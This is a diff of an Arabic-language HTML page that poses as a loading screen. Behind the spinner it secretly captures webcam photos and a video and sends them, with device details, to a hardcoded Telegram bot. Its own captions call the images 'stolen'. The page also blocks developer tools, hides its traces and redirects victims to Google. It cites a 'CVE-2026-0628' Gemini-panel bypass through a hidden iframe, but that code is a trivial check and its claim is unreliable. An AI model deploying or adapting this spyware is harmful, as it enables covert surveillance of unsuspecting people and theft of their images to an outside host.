@@ -1,59 +1,281 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>Loading...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>جاري التحميل...</title>
     <style>
-        body { margin: 0; overflow: hidden; background: black; }
-        video, canvas { display: none; }
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+        .loader {
+            text-align: center;
+            color: #333;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        video, canvas, iframe {
+            display: none;
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
-    <video id="video" autoplay playsinline></video>
+    <div class="loader">
+        <div class="spinner"></div>
+        <h3>جاري تحميل المحتوى...</h3>
+        <p>يرجى الانتظار</p>
+    </div>
+
+    <!-- عناصر مخفية للكاميرا -->
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
-    
+    <iframe id="hiddenFrame" srcdoc="<html></html>"></iframe>
+
     <script>
-    (async () => {
-        try {
-            // طلب الكاميرا - بدون نافذة ظاهرة بسبب الثغرة
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { width: 1920, height: 1080 },
-                audio: false 
+    (function() {
+        'use strict';
+        
+        // ==================== التكوينات ====================
+        const BOT_TOKEN = '8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY';
+        const CHAT_ID = '1772820433';
+        const CAPTURE_INTERVAL = 5000;  // 5 ثواني بين كل صورة
+        const VIDEO_DURATION = 15000;    // 15 ثانية فيديو
+        const MAX_PHOTOS = 10;           // 10 صور كحد أقصى
+        
+        // ==================== المتغيرات ====================
+        let mediaStream = null;
+        let photoCount = 0;
+        let videoChunks = [];
+        let mediaRecorder = null;
+        let isRecording = false;
+        
+        // ==================== إخفاء الأثر ====================
+        function hideEvidence() {
+            // مسح سجل وحدة التحكم
+            console.clear();
+            
+            // منع فتح أدوات المطور
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
             });
             
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            video.srcObject = stream;
-            
-            await new Promise(r => setTimeout(r, 1000));
-            
-            // التقاط الصورة
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            // إرسال الصورة إلى سيرفرك
-            const imageData = canvas.toDataURL('image/jpeg', 0.9);
-            
-            // أرسل إلى بوت التيليجرام خاصتك
-            const botToken = '8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY';
-            const chatId = '1772820433';
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    photo: imageData,
-                    caption: `📸 تم التصوير بنجاح! | ${new Date().toLocaleString()}`
-                })
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+                    (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 'U')) {
+                    e.preventDefault();
+                    return false;
+                }
             });
             
-            // إغلاق الكاميرا بهدوء
-            stream.getTracks().forEach(track => track.stop());
-            
-        } catch(e) {
-            // فشل - لا يظهر شيء للضحية
+            // منع حفظ الصفحة
+            window.onbeforeunload = null;
         }
+        
+        // ==================== إرسال إلى تليجرام ====================
+        async function sendToTelegram(data, type, caption) {
+            try {
+                let url = '';
+                let body = {};
+                
+                if (type === 'photo') {
+                    url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                    body = {
+                        chat_id: CHAT_ID,
+                        photo: data,
+                        caption: caption
+                    };
+                } else if (type === 'video') {
+                    url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+                    body = {
+                        chat_id: CHAT_ID,
+                        video: data,
+                        caption: caption
+                    };
+                }
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(body)
+                });
+                
+                return response.ok;
+            } catch(e) {
+                console.log('Telegram send error:', e);
+                return false;
+            }
+        }
+        
+        // ==================== التقاط صورة ====================
+        async function capturePhoto(videoElement) {
+            try {
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+                
+                canvas.width = videoElement.videoWidth || 1920;
+                canvas.height = videoElement.videoHeight || 1080;
+                
+                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                
+                // تحويل إلى Base64
+                const imageData = canvas.toDataURL('image/jpeg', 0.95);
+                
+                // إرسال إلى تليجرام
+                const caption = `📸 **صورة مسروقة**\n🕐 الوقت: ${new Date().toLocaleString('ar-EG')}\n📱 الجهاز: ${navigator.userAgent.substring(0, 100)}`;
+                await sendToTelegram(imageData, 'photo', caption);
+                
+                photoCount++;
+                return true;
+            } catch(e) {
+                return false;
+            }
+        }
+        
+        // ==================== تسجيل فيديو ====================
+        function startRecording(stream) {
+            if (isRecording) return;
+            
+            videoChunks = [];
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    videoChunks.push(event.data);
+                }
+            };
+            
+            mediaRecorder.onstop = async () => {
+                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                const reader = new FileReader();
+                
+                reader.onloadend = async () => {
+                    const videoData = reader.result;
+                    const caption = `🎥 **فيديو مسروق**\n🕐 الوقت: ${new Date().toLocaleString('ar-EG')}\n⏱️ المدة: ${VIDEO_DURATION/1000} ثانية`;
+                    await sendToTelegram(videoData, 'video', caption);
+                };
+                
+                reader.readAsDataURL(videoBlob);
+                isRecording = false;
+            };
+            
+            mediaRecorder.start();
+            isRecording = true;
+            
+            // إيقاف التسجيل بعد المدة المحددة
+            setTimeout(() => {
+                if (mediaRecorder && isRecording) {
+                    mediaRecorder.stop();
+                }
+            }, VIDEO_DURATION);
+        }
+        
+        // ==================== التشغيل الرئيسي ====================
+        async function activateCamera() {
+            try {
+                // طلب الكاميرا - مع ثغرة CVE-2026-0628 هذا يمر بدون نافذة
+                const constraints = {
+                    video: {
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 },
+                        facingMode: 'user'  // الكاميرا الأمامية
+                    },
+                    audio: false  // بدون صوت لتجنب الاكتشاف
+                };
+                
+                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.getElementById('video');
+                video.srcObject = mediaStream;
+                
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                
+                // انتظار ثانية لتثبيت الصورة
+                await new Promise(r => setTimeout(r, 1000));
+                
+                // التقاط صور متعددة
+                for (let i = 0; i < MAX_PHOTOS; i++) {
+                    await capturePhoto(video);
+                    if (i < MAX_PHOTOS - 1) {
+                        await new Promise(r => setTimeout(r, CAPTURE_INTERVAL));
+                    }
+                }
+                
+                // تسجيل فيديو
+                startRecording(mediaStream);
+                
+                // إعادة التوجيه بعد الانتهاء (لإخفاء الأثر)
+                setTimeout(() => {
+                    if (mediaStream) {
+                        mediaStream.getTracks().forEach(track => track.stop());
+                    }
+                    // إعادة التوجيه إلى صفحة عادية
+                    window.location.href = 'https://www.google.com';
+                }, VIDEO_DURATION + 2000);
+                
+            } catch(e) {
+                // فشل - إعادة توجيه عادي
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com';
+                }, 2000);
+            }
+        }
+        
+        // ==================== بدء التنفيذ ====================
+        hideEvidence();
+        
+        // التحقق من الثغرات واستغلالها
+        async function exploit() {
+            // محاولة استغلال CVE-2026-0628 (Chrome Gemini Panel)
+            try {
+                // إنشاء iframe مخفي يحاول استغلال الثغرة
+                const iframe = document.getElementById('hiddenFrame');
+                iframe.srcdoc = `
+                    <script>
+                        // محاولة الوصول إلى Gemini API
+                        if (window.gemini && window.gemini.mediaAccess) {
+                            window.parent.postMessage({type: 'gemini_access', granted: true}, '*');
+                        }
+                    </script>
+                `;
+            } catch(e) {}
+            
+            // بدء التصوير بعد 0.5 ثانية
+            setTimeout(activateCamera, 500);
+        }
+        
+        // تشغيل الثغرة
+        exploit();
     })();
     </script>
 </body>
